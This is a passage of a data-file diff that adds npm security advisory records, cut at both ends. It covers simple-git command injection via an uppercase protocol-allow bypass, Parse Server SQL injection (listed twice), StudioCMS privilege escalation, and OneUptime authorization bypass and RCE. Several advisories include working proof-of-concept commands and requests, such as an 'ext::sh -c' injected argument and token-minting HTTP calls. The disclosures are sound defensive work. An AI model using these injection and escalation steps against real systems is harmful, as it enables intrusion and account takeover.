repository.\n\nPlease make sure you have the correct access rights\nand the repository exists.\n\n    at Object.action (.../simple-git/dist/cjs/index.js:1440:25)\n    at PluginStore.exec (.../simple-git/dist/cjs/index.js:1489:29) {\n  task: {\n    commands: [\n      'clone',\n      '-c',\n      'PROTOCOL.ALLOW=always',\n      'ext::sh -c touch% /tmp/pwn-codeant% &gt;&amp;2',\n      '/tmp/example-new-repo-2'\n    ],\n    format: 'utf-8',\n    parser: [Function: parser]\n  }\n}\n</code></pre>\n<p><code>/tmp/pwn-codeant</code> was created by the git subprocess — command execution confirmed.</p>\n<hr>\n<h3 id=\"vector-3--real-world-scenario-target-httpsgithubcomcodeant-aicodeant-quality-gates\">Vector 3 — Real-world scenario (target: <code>https://github.com/CodeAnt-AI/codeant-quality-gates</code>)</h3>\n<p><strong>Result: BYPASSED ⚠️ — RCE confirmed</strong></p>\n<p>An application passes user-controlled <code>customArgs</code> to <code>simpleGit().clone()</code>. The attacker injects <code>PROTOCOL.ALLOW=always</code> and substitutes a malicious <code>ext::</code> URL in place of the intended repository URL. The plugin does not block the uppercase variant; git enables <code>ext::</code> and executes the payload before the application can detect the failure.</p>\n<p><strong>Output:</strong></p>\n<pre><code>real-world scenario [target: https://github.com/CodeAnt-AI/codeant-quality-gates]: PWNED — /tmp/pwn-realworld created\n</code></pre>\n<p><code>/tmp/pwn-realworld</code> was created — arbitrary command execution in a realistic application context confirmed.</p>\n<hr>\n<h2 id=\"summary-1\">Summary</h2>\n<table>\n<thead>\n<tr>\n<th>#</th>\n<th>Vector</th>\n<th>Payload</th>\n<th>Sentinel file</th>\n<th>Result</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>1</td>\n<td>CVE-2022-25912 original</td>\n<td><code>protocol.ext.allow=always</code> (lowercase)</td>\n<td>not created</td>\n<td>Blocked ✅</td>\n</tr>\n<tr>\n<td>2</td>\n<td>Case-sensitivity bypass</td>\n<td><code>PROTOCOL.ALLOW=always</code> (uppercase)</td>\n<td><code>/tmp/pwn-codeant</code> created</td>\n<td><strong>RCE ⚠️</strong></td>\n</tr>\n<tr>\n<td>3</td>\n<td>Real-world app scenario</td>\n<td><code>PROTOCOL.ALLOW=always</code> + attacker URL</td>\n<td><code>/tmp/pwn-realworld</code> created</td>\n<td><strong>RCE ⚠️</strong></td>\n</tr>\n</tbody></table>\n<p>The case-sensitive regex in <code>preventProtocolOverride</code> blocks <code>protocol.*.allow</code> but does not account for uppercase or mixed-case variants. Git accepts all variants identically due to case-insensitive config key normalisation, allowing full bypass of the protection in all versions of simple-git that carry the 2022 fix.</p>\n<p><code>/tmp/pwned</code> is created by the git subprocess via the <code>ext::</code> protocol.</p>\n<p>All of the following bypass the check:</p>\n<table>\n<thead>\n<tr>\n<th>Argument passed via <code>-c</code></th>\n<th align=\"center\">Regex matches?</th>\n<th align=\"center\">Git honours it?</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>protocol.allow=always</code></td>\n<td align=\"center\">✅ blocked</td>\n<td align=\"center\">✅</td>\n</tr>\n<tr>\n<td><code>PROTOCOL.ALLOW=always</code></td>\n<td align=\"center\">❌ bypassed</td>\n<td align=\"center\">✅</td>\n</tr>\n<tr>\n<td><code>Protocol.Allow=always</code></td>\n<td align=\"center\">❌ bypassed</td>\n<td align=\"center\">✅</td>\n</tr>\n<tr>\n<td><code>PROTOCOL.allow=always</code></td>\n<td align=\"center\">❌ bypassed</td>\n<td align=\"center\">✅</td>\n</tr>\n<tr>\n<td><code>protocol.ALLOW=always</code></td>\n<td align=\"center\">❌ bypassed</td>\n<td align=\"center\">✅</td>\n</tr>\n</tbody></table>\n<hr>\n<h3 id=\"impact\">Impact</h3>\n<p>Any application that passes user-controlled values into the <code>customArgs</code>\nparameter of <code>clone()</code>, <code>fetch()</code>, <code>pull()</code>, <code>push()</code> or similar <code>simple-git</code>\nmethods is vulnerable to arbitrary command execution on the host machine.</p>\n<p>The <code>ext::</code> git protocol executes an arbitrary binary as a remote helper.\nWith <code>protocol.allow=always</code> enabled, an attacker can run any OS command\nas the process user — full read, write and execution access on the host.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/steveukx/git-js/commit/f7042088aa2dac59e3c49a84d7a2f4b26048a257\">https://github.com/steveukx/git-js/commit/f7042088aa2dac59e3c49a84d7a2f4b26048a257</a></li>\n<li><a href=\"https://www.codeant.ai/security-research/security-research-simple-git-remote-code-execution-cve-2026-28292\">https://www.codeant.ai/security-research/security-research-simple-git-remote-code-execution-cve-2026-28292</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r275-fr43-pm7q\">https://github.com/advisories/GHSA-r275-fr43-pm7q</a></li>\n</ul>\n",
+          "date_modified": "2026-03-10T18:38:58.000Z",
+          "date_published": "2026-03-10T18:38:56.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-r275-fr43-pm7q"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "2c9a947f9ca9250cba83055210564a0b",
+        "url": "https://github.com/advisories/GHSA-qpr4-jrj4-6f27",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[parse-server] Parse Server: SQL injection via dot-notation field name in PostgreSQL",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-11T00:24:39Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-qpr4-jrj4-6f27"
+          ],
+          "content_hash": "sha256:54fa732652368b7a83330e56785bf8620b4ad33f877ceec9e792c8be2711d257"
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>An attacker can use a dot-notation field name in combination with the <code>sort</code> query parameter to inject SQL into the PostgreSQL database through an improper escaping of sub-field values in dot-notation queries. The vulnerability may also affect queries that use dot-notation field names with the <code>distinct</code> and <code>where</code> query parameters.</p>\n<p>This vulnerability only affects deployments using a PostgreSQL database.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The fix escapes characters in dot-notation sub-field values that could allow a SQL breakout.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There is no known workaround.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>GitHub security advisory: <a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-qpr4-jrj4-6f27\">https://github.com/parse-community/parse-server/security/advisories/GHSA-qpr4-jrj4-6f27</a></li>\n<li>Fix Parse Server 9: <a href=\"https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.2\">https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.2</a></li>\n<li>Fix Parse Server 8: <a href=\"https://github.com/parse-community/parse-server/releases/tag/8.6.28\">https://github.com/parse-community/parse-server/releases/tag/8.6.28</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-qpr4-jrj4-6f27\">https://github.com/parse-community/parse-server/security/advisories/GHSA-qpr4-jrj4-6f27</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/releases/tag/8.6.28\">https://github.com/parse-community/parse-server/releases/tag/8.6.28</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.2\">https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qpr4-jrj4-6f27\">https://github.com/advisories/GHSA-qpr4-jrj4-6f27</a></li>\n</ul>\n",
+          "date_modified": "2026-03-10T18:25:28.000Z",
+          "date_published": "2026-03-10T18:25:27.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-qpr4-jrj4-6f27"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "2c9a947f9ca9250cba83055210564a0b",
+        "url": "https://github.com/advisories/GHSA-qpr4-jrj4-6f27",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[parse-server] Parse Server: SQL injection via dot-notation field name in PostgreSQL",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-11T00:24:39Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-qpr4-jrj4-6f27"
+          ],
+          "content_hash": "sha256:54fa732652368b7a83330e56785bf8620b4ad33f877ceec9e792c8be2711d257"
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>An attacker can use a dot-notation field name in combination with the <code>sort</code> query parameter to inject SQL into the PostgreSQL database through an improper escaping of sub-field values in dot-notation queries. The vulnerability may also affect queries that use dot-notation field names with the <code>distinct</code> and <code>where</code> query parameters.</p>\n<p>This vulnerability only affects deployments using a PostgreSQL database.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The fix escapes characters in dot-notation sub-field values that could allow a SQL breakout.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There is no known workaround.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>GitHub security advisory: <a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-qpr4-jrj4-6f27\">https://github.com/parse-community/parse-server/security/advisories/GHSA-qpr4-jrj4-6f27</a></li>\n<li>Fix Parse Server 9: <a href=\"https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.2\">https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.2</a></li>\n<li>Fix Parse Server 8: <a href=\"https://github.com/parse-community/parse-server/releases/tag/8.6.28\">https://github.com/parse-community/parse-server/releases/tag/8.6.28</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-qpr4-jrj4-6f27\">https://github.com/parse-community/parse-server/security/advisories/GHSA-qpr4-jrj4-6f27</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/releases/tag/8.6.28\">https://github.com/parse-community/parse-server/releases/tag/8.6.28</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.2\">https://github.com/parse-community/parse-server/releases/tag/9.6.0-alpha.2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qpr4-jrj4-6f27\">https://github.com/advisories/GHSA-qpr4-jrj4-6f27</a></li>\n</ul>\n",
+          "date_modified": "2026-03-10T18:25:28.000Z",
+          "date_published": "2026-03-10T18:25:27.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-qpr4-jrj4-6f27"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "01ab8813aabae5e3b8c8e9bd000a7509",
+        "url": "https://github.com/advisories/GHSA-667w-mmh7-mrr4",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[studiocms] StudioCMS has Privilege Escalation via Insecure API Token Generation",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-11T00:24:39Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-667w-mmh7-mrr4"
+          ],
+          "content_hash": "sha256:451a78165ecce8f28d23f05d60d3d76993f769f30fdf6239185a9f3e7bde3306"
+        },
+        "signals": {
+          "severity": {
+            "level": "high",
+            "source": "keyword",
+            "provenance": {
+              "method": "keyword_scan",
+              "authority": "npm Security Advisories",
+              "authority_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm",
+              "evidence_url": "https://github.com/advisories/GHSA-667w-mmh7-mrr4"
+            }
+          }
+        },
+        "source_payload": {
+          "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>The /studiocms_api/dashboard/api-tokens endpoint allows any authenticated user (at least Editor) to generate API tokens for any other user, including owner and admin accounts. The endpoint fails to validate whether the requesting user is authorized to create tokens on behalf of the target user ID, resulting in a full privilege escalation.</p>\n<h2 id=\"details\">Details</h2>\n<p>The API token generation endpoint accepts a user parameter in the request body that specifies which user the token should be created for. The server-side logic authenticates the session (via auth_session cookie) but does not verify that the authenticated user matches the target user ID nor checks if the caller has sufficient privileges to perform this action on behalf of another user.\nThis is a classic BOLA vulnerability: the authorization check is limited to \"is the user logged in?\" instead of \"is this user authorized to perform this action on this specific resource?\"</p>\n<h4 id=\"vulnerable-code\">Vulnerable Code</h4>\n<p>The following is the server-side handler for the POST /studiocms_api/dashboard/api-tokens endpoint:\n<strong>File:</strong> packages/studiocms/frontend/pages/studiocms_api/dashboard/api-tokens.ts (lines 16–57)\n<strong>Version:</strong> <a href=\"mailto:studiocms@0.3.0\">studiocms@0.3.0</a></p>\n<pre><code>POST: (ctx) =&gt;\n    genLogger('studiocms/routes/api/dashboard/api-tokens.POST')(function* () {\n        const sdk = yield* SDKCore;\n\n        // Check if demo mode is enabled\n        if (developerConfig.demoMode !== false) {\n            return apiResponseLogger(403, 'Demo mode is enabled, this action is not allowed.');\n        }\n\n        // Get user data\n        const userData = ctx.locals.StudioCMS.security?.userSessionData;       // [1]\n\n        // Check if user is logged in\n        if (!userData?.isLoggedIn) {                                            // [2]\n            return apiResponseLogger(403, 'Unauthorized');\n        }\n\n        // Check if user has permission\n        const isAuthorized = ctx.locals.StudioCMS.security?.userPermissionLevel.isEditor;  // [3]\n        if (!isAuthorized) {\n            return apiResponseLogger(403, 'Unauthorized');\n        }\n\n        // Get Json Data\n        const jsonData = yield* readAPIContextJson&lt;{\n            description: string;\n            user: string;                                                       // [4]\n        }&gt;(ctx);\n\n        // Validate form data\n        if (!jsonData.description) {\n            return apiResponseLogger(400, 'Invalid form data, description is required');\n        }\n\n        if (!jsonData.user) {\n            return apiResponseLogger(400, 'Invalid form data, user is required');\n        }\n\n        // [5] jsonData.user passed directly — no check against userData\n        const newToken = yield* sdk.REST_API.tokens.new(jsonData.user, jsonData.description);\n\n        return createJsonResponse({ token: newToken.key });                     // [6]\n    }),\n</code></pre>\n<p><strong>Analysis</strong>\nThe authorization logic has three distinct flaws:</p>\n<ol>\n<li><strong>Insufficient permission gate [1][2][3]:</strong> The handler retrieves the session from ctx.locals.StudioCMS.security and only verifies that isEditor is true. This means any user with editor privileges or above passes the gate. </li>\n<li><strong>Missing object-level authorization [4][5]:</strong> The user field from the JSON payload (line 54) is passed directly to sdk.REST_API.tokens.new() without any comparison against userData (the authenticated caller's identity from the session at [1]). There is no check such as jsonData.user === userData.id. This allows any authenticated user to specify an arbitrary target UUID and generate a token for that account.</li>\n<li><strong>No target role validation [5]:</strong> Even if cross-user token generation were an intended feature, there is no check to prevent a lower-privileged user from generating tokens for higher-privileged accounts (admin, owner).</li>\n</ol>\n<h2 id=\"poc\">PoC</h2>\n<p><strong>Environment</strong>\nThe following user roles were identified in the application:\n<em>User ID | Role</em>\n2450bf33-0135-4142-80be-9854f9a5e9f1 | owner\neacee42e-ae7e-4e9e-945b-68e26696ece4 | admin\n2d93a386-e9cb-451e-a811-d8a34bfdf4da | admin\n39b3e7d3-5eb0-48e1-abdc-ce95a57b212c | editor\na1585423-9ade-426e-a713-9c81ed035463 | visitor</p>\n<p><strong>Step 1 — Generate an API Token for the Owner (as Editor)</strong>\nAn authenticated Editor sends the following request, specifying the owner user ID in the body:</p>\n<pre><code>POST /studiocms_api/dashboard/api-tokens HTTP/1.1\nHost: &lt;target&gt;\nCookie: auth_session=&lt;editor_session_cookie&gt;\nContent-Type: application/json\nContent-Length: 74\n\n{\n  \"user\": \"2450bf33-0135-4142-80be-9854f9a5e9f1\",\n  \"description\": \"pwn\"\n}\n</code></pre>\n<p><strong>Result:</strong> The server returns a valid JWT token bound to the owner account.</p>\n<p><strong>Step 2 — Use the Token to Access the API as Owner</strong></p>\n<pre><code>curl -H \"Authorization: Bearer &lt;owner_jwt_token&gt;\" http://&lt;target&gt;/studiocms_api/rest/v1/users\n</code></pre>\n<p><strong>Result:</strong> The attacker now has full API access with owner privileges, including the ability to list all users, modify content, and manage the application.</p>\n<h2 id=\"impact\">Impact</h2>\n<ul>\n<li><strong>Privilege Escalation:</strong> Any authenticated user (above visitor) can escalate to owner level access.</li>\n<li><strong>Full API Access:</strong> The generated token grants unrestricted access to all REST API endpoints with the impersonated user's permissions.</li>\n<li><strong>Account Takeover:</strong> An attacker can impersonate any user in the system by specifying their UUID.</li>\n<li><strong>Data Breach:</strong> Access to user listings, content management, and potentially sensitive configuration data.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/withstudiocms/studiocms/security/advisories/GHSA-667w-mmh7-mrr4\">https://github.com/withstudiocms/studiocms/security/advisories/GHSA-667w-mmh7-mrr4</a></li>\n<li><a href=\"https://github.com/withstudiocms/studiocms/commit/9eec9c3b45523b635cfe16d55aa55afabacbebe3\">https://github.com/withstudiocms/studiocms/commit/9eec9c3b45523b635cfe16d55aa55afabacbebe3</a></li>\n<li><a href=\"https://github.com/withstudiocms/studiocms/releases/tag/studiocms%400.4.0\">https://github.com/withstudiocms/studiocms/releases/tag/studiocms%400.4.0</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-30944\">https://nvd.nist.gov/vuln/detail/CVE-2026-30944</a></li>\n<li><a href=\"https://github.com/withstudiocms/studiocms/commit/f4a209fc090c90195e2419fff47b48a46eab7441\">https://github.com/withstudiocms/studiocms/commit/f4a209fc090c90195e2419fff47b48a46eab7441</a></li>\n<li><a href=\"https://github.com/withstudiocms/studiocms/releases/tag/studiocms@0.4.0\">https://github.com/withstudiocms/studiocms/releases/tag/studiocms@0.4.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-667w-mmh7-mrr4\">https://github.com/advisories/GHSA-667w-mmh7-mrr4</a></li>\n</ul>\n",
+          "date_modified": "2026-03-10T18:45:50.000Z",
+          "date_published": "2026-03-10T18:16:41.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-667w-mmh7-mrr4"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "c81b017e679b7b05478252ff449a94e5",
+        "url": "https://github.com/advisories/GHSA-cw6x-mw64-q6pv",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[@oneuptime/common] OneUptime has WhatsApp Resend Verification Authorization Bypass",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-11T00:24:39Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-cw6x-mw64-q6pv"
+          ],
+          "content_hash": "sha256:9904a0ab1f569fe1d8fe3cf7732ebee068b3986b957718641b68fe9d2e34dda6"
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"description\">Description</h3>\n<p>  The resend-verification-code endpoint allows any authenticated user to trigger a verification code resend for any <code>UserWhatsApp</code> record by ID. Ownership is not validated (unlike the verify endpoint).</p>\n<h3 id=\"affected-source\">Affected Source</h3>\n<ul>\n<li>Endpoint: <a href=\"https://github.com/OneUptime/oneuptime/Common/Server/API/UserWhatsAppAPI.ts#L129-L153\">UserWhatsAppAPI.ts</a>  </li>\n<li>Service: <a href=\"https://github.com/OneUptime/oneuptime/Common/Server/API/UserWhatsAppAPI.ts#L129-L153\">UserWhatsAppService.ts</a>  </li>\n<li>Verify ownership (present in verify endpoint for comparison): <a href=\"https://github.com/OneUptime/oneuptime/Common/Server/API/UserWhatsAppAPI.ts#L78-L87\">UserWhatsAppAPI.ts</a></li>\n</ul>\n<h3 id=\"full-code-lines-userwhatsappapits\">Full Code Lines (UserWhatsAppAPI.ts)</h3>\n<p>Resend path (authorization gap):</p>\n<pre><code class=\"language-ts\">    this.router.post(\n      `${new this.entityType()\n        .getCrudApiPath()\n        ?.toString()}/resend-verification-code`,\n      UserMiddleware.getUserMiddleware,\n      async (req: ExpressRequest, res: ExpressResponse, next: NextFunction) =&gt; {\n        try {\n          req = req as OneUptimeRequest;\n\n          if (!req.body.itemId) {\n            return Response.sendErrorResponse(\n              req,\n              res,\n              new BadDataException(\"Invalid item ID\"),\n            );\n          }\n\n          await this.service.resendVerificationCode(req.body.itemId);\n\n          return Response.sendEmptySuccessResponse(req, res);\n        } catch (err) {\n          return next(err);\n        }\n      },\n    );\n</code></pre>\n<p>Verify path (ownership check present):</p>\n<pre><code class=\"language-ts\">          if (\n            item.userId?.toString() !==\n            (req as OneUptimeRequest)?.userAuthorization?.userId?.toString()\n          ) {\n            return Response.sendErrorResponse(\n              req,\n              res,\n              new BadDataException(\"Invalid user ID\"),\n            );\n          }\n</code></pre>\n<h2 id=\"prerequisites\">Prerequisites</h2>\n<ul>\n<li>Valid attacker account with access to a project</li>\n<li>Attacker access token</li>\n<li>A victim’s <code>UserWhatsApp</code> itemId belonging to the same project</li>\n</ul>\n<h2 id=\"steps-to-reproduce\">Steps to Reproduce</h2>\n<ol>\n<li><p>Set your attacker token:</p>\n<pre><code class=\"language-bash\">export ATK=\"Bearer &lt;attacker-access-token&gt;\"\n</code></pre>\n</li>\n<li><p>Trigger resend for the victim’s item:</p>\n<pre><code class=\"language-bash\">curl -s -X POST \\\n  -H \"Content-Type: application/json\" \\\n  -H \"Authorization: $ATK\" \\\n  -d '{\"itemId\":\"&lt;victim-userwhatsapp-id&gt;\"}' \\\n  http://&lt;host&gt;/api/user-whats-app/resend-verification-code\n</code></pre>\n</li>\n</ol>\n<h2 id=\"expectedobserved-behavior\">Expected/Observed Behavior</h2>\n<ul>\n<li>HTTP 200 with <code>{}</code> body and a new verification code sent to the victim’s phone</li>\n<li>No checks confirm that <code>item.userId</code> equals the authenticated user’s ID for the resend path</li>\n</ul>\n<h2 id=\"impact\">Impact</h2>\n<ul>\n<li>Spam/DoS against victims’ phone numbers, social engineering pressure, and potential lockout flows due to repeated resends</li>\n</ul>\n<h2 id=\"recommended-fix\">Recommended Fix</h2>\n<ul>\n<li>Enforce ownership: <code>item.userId</code> must match the authenticated user</li>\n<li>Add per-item and per-user rate limiting for resends</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/OneUptime/oneuptime/security/advisories/GHSA-cw6x-mw64-q6pv\">https://github.com/OneUptime/oneuptime/security/advisories/GHSA-cw6x-mw64-q6pv</a></li>\n<li><a href=\"https://github.com/OneUptime/oneuptime/releases/tag/10.0.21\">https://github.com/OneUptime/oneuptime/releases/tag/10.0.21</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-30959\">https://nvd.nist.gov/vuln/detail/CVE-2026-30959</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cw6x-mw64-q6pv\">https://github.com/advisories/GHSA-cw6x-mw64-q6pv</a></li>\n</ul>\n",
+          "date_modified": "2026-03-10T18:45:25.000Z",
+          "date_published": "2026-03-10T01:15:30.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-cw6x-mw64-q6pv"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "803a7f4ebede04e346b3bcc44edba487",
+        "url": "https://github.com/advisories/GHSA-jw8q-gjvg-8w4q",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[@oneuptime/common] OneUptime has Synthetic Monitor RCE via exposed Playwright browser object",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-11T00:24:39Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-jw8q-gjvg-8w4q"
+          ],
+          "content_hash": "sha256:44c6dfffd91cd621dc79a4827948ca35a665c0631a45bfc7a24aa39bc5d03595"
+        },
+        "signals": {
+          "severity": {
+            "level": "critical",
+            "source": "keyword",
+            "provenance": {
+              "method": "keyword_scan",
+              "authority": "npm Security Advisories",
+              "authority_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm",
+              "evidence_url": "https://github.com/advisories/GHSA-jw8q-gjvg-8w4q"
+            }
+          }
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>OneUptime Synthetic Monitors allow a low-privileged authenticated project user to execute arbitrary commands on the <code>oneuptime-probe</code> server/container.</p>\n<p>The root cause is that untrusted Synthetic Monitor code is executed inside Node's <code>vm</code> while live host-realm Playwright <code>browser</code> and <code>page</code> objects are exposed to it. A malicious user can call Playwright APIs on the injected <code>browser</code> object and cause the probe to spawn an attacker-controlled executable.</p>\n<p>This is a server-side remote code execution issue. It does not require a separate <code>vm</code> sandbox escape.</p>\n<h2 id=\"details\">Details</h2>\n<p>A normal project member can create or edit monitors and monitor tests:</p>\n<ul>\n<li><code>Monitor</code> access control: <a href=\"https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Common/Models/DatabaseModels/Monitor.ts#L45-L70\">https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Common/Models/DatabaseModels/Monitor.ts#L45-L70</a></li>\n<li><code>MonitorTest</code> access control: <a href=\"https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Common/Models/DatabaseModels/MonitorTest.ts#L27-L52\">https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Common/Models/DatabaseModels/MonitorTest.ts#L27-L52</a></li>\n</ul>\n<p>The dashboard exposes a Playwright code editor for Synthetic Monitors and allows a user to queue a test run:</p>\n<ul>\n<li>Synthetic Monitor editor: <a href=\"https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/App/FeatureSet/Dashboard/src/Components/Form/Monitor/MonitorStep.tsx#L260-L289\">https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/App/FeatureSet/Dashboard/src/Components/Form/Monitor/MonitorStep.tsx#L260-L289</a></li>\n<li><code>Test Monitor</code> flow: <a href=\"https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/App/FeatureSet/Dashboard/src/Components/Form/Monitor/MonitorTest.tsx#L69-L83\">https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/App/FeatureSet/Dashboard/src/Components/Form/Monitor/MonitorTest.tsx#L69-L83</a></li>\n</ul>\n<p>For <code>MonitorType.SyntheticMonitor</code>, attacker-controlled <code>customCode</code> is passed into <code>SyntheticMonitor.execute(...)</code>:</p>\n<ul>\n<li><a href=\"https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Probe/Utils/Monitors/Monitor.ts#L323-L338\">https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Probe/Utils/Monitors/Monitor.ts#L323-L338</a></li>\n</ul>\n<p><code>SyntheticMonitor.execute(...)</code> then calls <code>VMRunner.runCodeInNodeVM(...)</code> and injects live Playwright objects into the VM context:</p>\n<ul>\n<li><a href=\"https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Probe/Utils/Monitors/MonitorTypes/SyntheticMonitor.ts#L156-L168\">https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Probe/Utils/Monitors/MonitorTypes/SyntheticMonitor.ts#L156-L168</a></li>\n</ul>\n<p>Relevant code path:</p>\n<pre><code class=\"language-ts\">result = await VMRunner.runCodeInNodeVM({\n  code: options.script,\n  options: {\n    timeout: PROBE_SYNTHETIC_MONITOR_SCRIPT_TIMEOUT_IN_MS,\n    args: {},\n    context: {\n      browser: browserSession.browser,\n      page: browserSession.page,\n      screenSizeType: options.screenSizeType,\n      browserType: options.browserType,\n    },\n  },\n});\n</code></pre>\n<p><code>VMRunner.runCodeInNodeVM(...)</code> wraps host objects in proxies, but it still forwards normal method calls with the real host <code>this</code> binding. It only blocks a few property names such as <code>constructor</code>, <code>__proto__</code>, <code>prototype</code>, and <code>mainModule</code>:</p>\n<ul>\n<li>Blocked properties: <a href=\"https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Common/Server/Utils/VM/VMRunner.ts#L20-L25\">https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Common/Server/Utils/VM/VMRunner.ts#L20-L25</a></li>\n<li>Real host <code>this</code> binding during method calls: <a href=\"https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Common/Server/Utils/VM/VMRunner.ts#L81-L103\">https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Common/Server/Utils/VM/VMRunner.ts#L81-L103</a></li>\n<li>Additional context injection into the VM: <a href=\"https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Common/Server/Utils/VM/VMRunner.ts#L388-L395\">https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Common/Server/Utils/VM/VMRunner.ts#L388-L395</a></li>\n</ul>\n<p>Because of that, untrusted code can still use legitimate Playwright methods on the injected <code>browser</code> object.</p>\n<p>The probe pins Playwright <code>1.58.2</code>:</p>\n<ul>\n<li><a href=\"https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Probe/package-lock.json#L4438-L4459\">https://github.com/OneUptime/oneuptime/blob/707bfd62e721a2845ee05b87cb5d3c611bda2276/Probe/package-lock.json#L4438-L4459</a></li>\n</ul>\n<p>In that version, <code>Browser.browserType()</code> returns a <code>BrowserType</code> object, and <code>BrowserType.launch()</code> accepts attacker-controlled <code>executablePath</code>, <code>ignoreDefaultArgs</code>, and <code>args</code>. Playwright then passes those values into a child-process spawn path.</p>\n<p>As a result, a 